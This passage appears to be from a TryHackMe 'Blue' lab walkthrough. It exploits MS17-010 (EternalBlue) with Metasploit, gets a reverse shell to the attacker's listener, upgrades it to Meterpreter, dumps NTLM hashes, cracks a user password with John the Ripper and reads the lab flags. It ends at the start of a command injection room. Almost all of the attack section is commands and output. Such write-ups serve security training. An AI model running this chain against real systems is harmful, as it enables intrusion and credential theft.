<p>Let's run the <code>vuln</code> script to see if the target is vulnerable to any commonly known vulnerabilities.</p> <pre><code>sudo nmap -sV -oN nmap_vuln.output --script vuln $IP\n</code></pre> <p></p> <p>Looks like the target it vulnerable to <code>ms17-010: RCE vulnerability in Microsoft SMBv1 servers (Eternal Blue)</code></p>"},{"location":"walkthroughs/thm/blue/#exploitation","title":"Exploitation","text":"<p>Let's start up Metasploit using the <code>msfconsole</code> command and exploit the vulnerability to gain a foothold on the target. Search for exploits related to <code>ms17-010</code>.</p> <pre><code>msf6 &gt; search ms17-010\n\nMatching Modules\n================\n\n   #  Name                                      Disclosure Date  Rank     Check  Description\n   -  ----                                      ---------------  ----     -----  -----------\n   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection\n   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n\n\nInteract with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce\n\nmsf6 &gt;\n</code></pre> <p>Let's get some more information on the <code>exploit/windows/smb/ms17_010_eternalblue</code> module.</p> <pre><code>msf6 &gt; info 0\n\n       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n     Module: exploit/windows/smb/ms17_010_eternalblue\n   Platform: Windows\n       Arch: x64\n Privileged: Yes\n    License: Metasploit Framework License (BSD)\n       Rank: Average\n  Disclosed: 2017-03-14\n\nProvided by:\n  Equation Group\n  Shadow Brokers\n  sleepya\n  Sean Dillon &lt;sean.dillon@risksense.com&gt;\n  Dylan Davis &lt;dylan.davis@risksense.com&gt;\n  thelightcosine\n  wvu &lt;wvu@metasploit.com&gt;\n  agalway-r7\n  cdelafuente-r7\n  cdelafuente-r7\n  agalway-r7\n\nAvailable targets:\n  Id  Name\n  --  ----\n  0   Automatic Target\n  1   Windows 7\n  2   Windows Embedded Standard 7\n  3   Windows Server 2008 R2\n  4   Windows 8\n  5   Windows 8.1\n  6   Windows Server 2012\n  7   Windows 10 Pro\n  8   Windows 10 Enterprise Evaluation\n\nCheck supported:\n  Yes\n\nBasic options:\n  Name           Current Setting  Required  Description\n  ----           ---------------  --------  -----------\n  RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework\n                                            /wiki/Using-Metasploit\n  RPORT          445              yes       The target port (TCP)\n  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects\n                                            Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target\n                                            machines.\n  SMBPass                         no        (Optional) The password for the specified username\n  SMBUser                         no        (Optional) The username to authenticate as\n  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind\n                                            ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach\n                                            ines.\n  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server\n                                             2008 R2, Windows 7, Windows Embedded Standard 7 target machines.\n\nPayload information:\n  Space: 2000\n\nDescription:\n  This module is a port of the Equation Group ETERNALBLUE exploit, \n  part of the FuzzBunch toolkit released by Shadow Brokers. There is a \n  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is \n  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error \n  where a DWORD is subtracted into a WORD. The kernel pool is groomed \n  so that overflow is well laid-out to overwrite an SMBv1 buffer. \n  Actual RIP hijack is later completed in \n  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may \n  not trigger 100% of the time, and should be run continuously until \n  triggered. It seems like the pool will get hot streaks and need a \n  cool down period before the shells rain in again. The module will \n  attempt to use Anonymous login, by default, to authenticate to \n  perform the exploit. If the user supplies credentials in the \n  SMBUser, SMBPass, and SMBDomain options it will use those instead. \n  On some systems, this module may cause system instability and \n  crashes, such as a BSOD or a reboot. This may be more likely with \n  some payloads.\n\nReferences:\n  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010\n  https://nvd.nist.gov/vuln/detail/CVE-2017-0143\n  https://nvd.nist.gov/vuln/detail/CVE-2017-0144\n  https://nvd.nist.gov/vuln/detail/CVE-2017-0145\n  https://nvd.nist.gov/vuln/detail/CVE-2017-0146\n  https://nvd.nist.gov/vuln/detail/CVE-2017-0147\n  https://nvd.nist.gov/vuln/detail/CVE-2017-0148\n  https://github.com/RiskSense-Ops/MS17-010\n  https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf\n  https://www.exploit-db.com/exploits/42030\n\nAlso known as:\n  ETERNALBLUE\n\n\nView the full module info with the info -d command.\n\nmsf6 &gt; \n</code></pre> <p>Let's go ahead and use this module and set the RHOSTS and LHOST options.</p> <pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.234.217\nRHOSTS =&gt; 10.10.234.217\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.2.4.35\nLHOST =&gt; 10.2.4.35\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS         10.10.234.217    yes       The target host(s), see https://github.com/rapid7/metasploit-framewor\n                                             k/wiki/Using-Metasploit\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects\n                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe\n                                             t machines.\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win\n                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma\n                                             chines.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve\n                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.2.4.35        yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Target\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; \n</code></pre> <p>Set the payload as reverse_tcp and run the exploit.</p> <pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/shell/reverse_tcp\npayload =&gt; windows/x64/shell/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit\n\n[*] Started reverse TCP handler on 10.2.4.35:4444 \n[*] 10.10.234.217:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 10.10.234.217:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.234.217:445     - Scanned 1 of 1 hosts (100% complete)\n[+] 10.10.234.217:445 - The target is vulnerable.\n[*] 10.10.234.217:445 - Connecting to target for exploitation.\n[+] 10.10.234.217:445 - Connection established for exploitation.\n[+] 10.10.234.217:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.234.217:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.234.217:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.234.217:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.234.217:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      \n[+] 10.10.234.217:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.234.217:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.234.217:445 - Sending all but last fragment of exploit packet\n[*] 10.10.234.217:445 - Starting non-paged pool grooming\n[+] 10.10.234.217:445 - Sending SMBv2 buffers\n[+] 10.10.234.217:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.234.217:445 - Sending final SMBv2 buffers.\n[*] 10.10.234.217:445 - Sending last fragment of exploit packet!\n[*] 10.10.234.217:445 - Receiving response from exploit packet\n[+] 10.10.234.217:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.234.217:445 - Sending egg to corrupted connection.\n[*] 10.10.234.217:445 - Triggering free of corrupted buffer.\n[*] Sending stage (336 bytes) to 10.10.234.217\n[*] Command shell session 1 opened (10.2.4.35:4444 -&gt; 10.10.234.217:49230) at 2023-01-20 13:34:57 -0700\n[+] 10.10.234.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.234.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.234.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\n\nShell Banner:\nMicrosoft Windows [Version 6.1.7601]\n-----\n\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>Looks like we have an initial foothold.</p>"},{"location":"walkthroughs/thm/blue/#privilege-escalation","title":"Privilege Escalation","text":"<p>Background the current shell (Ctrl+Z) and upgrade our shell to a Meterpreter shell.</p> <pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show sessions\n\nActive sessions\n===============\n\n  Id  Name  Type               Information                               Connection\n  --  ----  ----               -----------                               ----------\n  2         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.2.4.35:4444 -&gt; 10.10.234.217:49242 (10\n                                6.1.7601] -----                          .10.234.217)\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; search shell_to_meterpreter\n\nMatching Modules\n================\n\n   #  Name                                    Disclosure Date  Rank    Check  Description\n   -  ----                                    ---------------  ----    -----  -----------\n   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade\n\n\nInteract with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use 0\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; show options\n\nModule options (post/multi/manage/shell_to_meterpreter):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection\n   LHOST                     no        IP of host that will receive the connection from the payload (Will try to a\n                                       uto detect).\n   LPORT    4433             yes       Port for payload to connect to.\n   SESSION                   yes       The session to run this module on\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 2\nSESSION =&gt; 2\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; show options\n\nModule options (post/multi/manage/shell_to_meterpreter):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection\n   LHOST                     no        IP of host that will receive the connection from the payload (Will try to a\n                                       uto detect).\n   LPORT    4433             yes       Port for payload to connect to.\n   SESSION  2                yes       The session to run this module on\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; exploit\n\n[*] Upgrading session ID: 2\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 10.2.4.35:4433 \n[*] Post module execution completed\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; \n[*] Sending stage (200774 bytes) to 10.10.234.217\n[*] Meterpreter session 3 opened (10.2.4.35:4433 -&gt; 10.10.234.217:49249) at 2023-01-20 13:50:44 -0700\n[*] Stopping exploit/multi/handler\n\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; show sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                            Connection\n  --  ----  ----                     -----------                            ----------\n  2         shell x64/windows        Shell Banner: Microsoft Windows [Vers  10.2.4.35:4444 -&gt; 10.10.234.217:49242\n                                     ion 6.1.7601] -----                    (10.10.234.217)\n  3         meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ JON-PC           10.2.4.35:4433 -&gt; 10.10.234.217:49249\n                                                                            (10.10.234.217)\n\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i -3\n[-] Invalid session identifier: -3\nmsf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 3\n[*] Starting interaction with 3...\n\nmeterpreter &gt; shell\nProcess 2188 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>Looks like we are NT AUTHORITY\\SYSTEM.</p> <p>List the running processes using the <code>ps</code> command.</p> <pre><code>C:\\Windows\\system32&gt;exit\nexit\nmeterpreter &gt; ps\n\nProcess List\n============\n\n PID   PPID  Name                Arch  Session  User                          Path\n ---   ----  ----                ----  -------  ----                          ----\n 0     0     [System Process]\n 4     0     System              x64   0\n 416   4     smss.exe            x64   0        NT AUTHORITY\\SYSTEM           \\SystemRoot\\System32\\smss.exe\n 428   712   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM\n 488   712   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM\n 564   556   csrss.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\csrss.exe\n 612   556   wininit.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\wininit.exe\n 624   604   csrss.exe           x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\csrss.exe\n 664   604   winlogon.exe        x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\winlogon.exe\n 712   612   services.exe        x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\services.exe\n 720   612   lsass.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\lsass.exe\n 728   612   lsm.exe             x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\lsm.exe\n 836   712   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM\n 904   712   svchost.exe         x64   0        NT AUTHORITY\\NETWORK SERVICE\n 952   712   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE\n 1020  664   LogonUI.exe         x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\LogonUI.exe\n 1088  712   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE\n 1160  2924  cmd.exe             x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\cmd.exe\n 1192  712   svchost.exe         x64   0        NT AUTHORITY\\NETWORK SERVICE\n 1352  712   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE\n 1416  712   amazon-ssm-agent.e  x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\SSM\\amazon-s\n             xe                                                               sm-agent.exe\n 1488  712   LiteAgent.exe       x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\XenTools\\Lit\n                                                                              eAgent.exe\n 1628  712   Ec2Config.exe       x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\Ec2ConfigSer\n                                                                              vice\\Ec2Config.exe\n 1932  712   svchost.exe         x64   0        NT AUTHORITY\\NETWORK SERVICE\n 2068  712   TrustedInstaller.e  x64   0        NT AUTHORITY\\SYSTEM\n             xe\n 2080  836   WmiPrvSE.exe\n 2200  564   conhost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\conhost.exe\n 2256  712   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE\n 2380  564   conhost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\conhost.exe\n 2444  712   sppsvc.exe          x64   0        NT AUTHORITY\\NETWORK SERVICE\n 2592  712   vds.exe             x64   0        NT AUTHORITY\\SYSTEM\n 2684  712   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM\n 2736  712   SearchIndexer.exe   x64   0        NT AUTHORITY\\SYSTEM\n 2876  2400  powershell.exe      x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\WindowsPowerShel\n                                                                              l\\v1.0\\powershell.exe\n 2924  712   spoolsv.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\spoolsv.exe\n\nmeterpreter &gt;\n</code></pre> <p>Let's migrate to PID 2924 (spoolsv.exe)</p> <pre><code>meterpreter &gt; migrate 2924\n[*] Migrating from 2876 to 2924...\n/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998: warning: Exception in finalizer #&lt;Proc:0x00007f099d3d08d0 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339&gt;\n/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': can't be called from trap context (ThreadError)\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:362:in `close'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339:in `block in finalize'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `chr'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `block in xor_bytes'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `each_byte'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `xor_bytes'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:952:in `to_r'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:137:in `send_packet'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:654:in `migrate'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:157:in `run'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'\n        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'\n        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'\n        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run'\n        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'\n        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'\n        from /usr/bin/msfconsole:23:in `&lt;main&gt;'\n/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998: warning: Exception in finalizer #&lt;Proc:0x00007f099d178a10 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339&gt;\n/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize': can't be called from trap context (ThreadError)\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:362:in `close'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339:in `block in finalize'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `chr'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `block in xor_bytes'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `each_byte'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `xor_bytes'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:952:in `to_r'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:137:in `send_packet'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:293:in `load_library'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:378:in `use'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:705:in `block in migrate'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:704:in `each'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:704:in `migrate'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:157:in `run'\n        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'\n        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'\n        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'\n        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1682:in `cmd_sessions'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'\n        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run'\n        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'\n        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'\n        from /usr/bin/msfconsole:23:in `&lt;main&gt;'\n[*] Migration completed successfully.\nmeterpreter &gt; \n</code></pre> <p>Let's dump the password hashes using command <code>hashdump</code> in meterpreter.</p> <pre><code>meterpreter &gt; hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::\nmeterpreter &gt;\n</code></pre> <p>We can use <code>John the Ripper</code> to crack the hash.</p> <pre><code>echo \"Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::\" &gt; hash2crack.txt\n</code></pre> <pre><code>john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  --format=NT hash2crack.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (NT [MD4 128/128 AVX 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\nalqfna22         (Jon)     \n1g 0:00:00:03 DONE (2023-01-20 14:15) 0.3236g/s 3301Kp/s 3301Kc/s 3301KC/s alqueva1968..alpus\nUse the \"--show --format=NT\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>Credentials Found: <code>Jon:alqfna22</code></p>"},{"location":"walkthroughs/thm/blue/#post-exploitation","title":"Post-Exploitation","text":"<p>First flag is in <code>C:\\</code>.</p> <pre><code>C:\\&gt;dir  \ndir\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\\n\n03/17/2019  01:27 PM                24 flag1.txt\n07/13/2009  09:20 PM    &lt;DIR&gt;          PerfLogs\n04/12/2011  02:28 AM    &lt;DIR&gt;          Program Files\n03/17/2019  04:28 PM    &lt;DIR&gt;          Program Files (x86)\n12/12/2018  09:13 PM    &lt;DIR&gt;          Users\n03/17/2019  04:36 PM    &lt;DIR&gt;          Windows\n               1 File(s)             24 bytes\n               5 Dir(s)  20,398,546,944 bytes free\n\nC:\\&gt;type flag1.txt\ntype flag1.txt\nflag{access_the_machine}\nC:\\&gt;\n</code></pre> <p>Flag 2 is in the <code>C:\\Windows\\System32\\config</code> folder.</p> <pre><code>C:\\Windows\\System32\\config&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\Windows\\System32\\config\n\n01/20/2023  01:42 PM    &lt;DIR&gt;          .\n01/20/2023  01:42 PM    &lt;DIR&gt;          ..\n12/12/2018  05:00 PM            28,672 BCD-Template\n01/20/2023  01:51 PM        18,087,936 COMPONENTS\n01/20/2023  03:17 PM           262,144 DEFAULT\n03/17/2019  01:32 PM                34 flag2.txt\n07/13/2009  08:34 PM    &lt;DIR&gt;          Journal\n01/20/2023  02:11 PM    &lt;DIR&gt;          RegBack\n03/17/2019  02:05 PM           262,144 SAM\n01/20/2023  01:51 PM           262,144 SECURITY\n01/20/2023  03:17 PM        40,632,320 SOFTWARE\n01/20/2023  03:23 PM        12,582,912 SYSTEM\n11/20/2010  08:41 PM    &lt;DIR&gt;          systemprofile\n12/12/2018  05:03 PM    &lt;DIR&gt;          TxR\n               8 File(s)     72,118,306 bytes\n               6 Dir(s)  20,398,546,944 bytes free\n\nC:\\Windows\\System32\\config&gt;type flag2.txt\ntype flag2.txt\nflag{sam_database_elevated_access}\nC:\\Windows\\System32\\config&gt;\n</code></pre> <p>Flag 3 is in Documents folder for Jon.</p> <pre><code>C:\\Users\\Jon\\Documents&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\Users\\Jon\\Documents\n\n12/12/2018  09:49 PM    &lt;DIR&gt;          .\n12/12/2018  09:49 PM    &lt;DIR&gt;          ..\n03/17/2019  01:26 PM                37 flag3.txt\n               1 File(s)             37 bytes\n               2 Dir(s)  20,398,546,944 bytes free\n\nC:\\Users\\Jon\\Documents&gt;type flag3.txt\ntype flag3.txt\nflag{admin_documents_can_be_valuable}\nC:\\Users\\Jon\\Documents&gt;\n</code></pre>"},{"location":"walkthroughs/thm/commandinjection/","title":"Command Injection","text":""},{"location":"walkthroughs/thm/commandinjection/#task-1-introduction","title":"Task 1 - Introduction","text":"<p>Web vulnerabilities related to command injection will be covered in this room. We will be looking at:</p> <ul> <li>How to discover command injection vulnerabilities.</li> <li>How to test and exploit this vulnerability using payloads designed for different OS.</li> <li>How to prevent this vulnerability in an application.</li> <li>Apply theory into practice.</li> </ul> <p>Command injection is the abuse of an application's behaviour to execute commands on the operating system with the same privileges that the application on a device is running with. A command injection vulnerability is also known as <code>Remote Code Execution (RCE)</code>.</p>"},{"location":"walkthroughs/thm/commandinjection/#task-2-discovering-command-injection","title":"Task 2 - Discovering Command Injection","text":"<p>Command injection 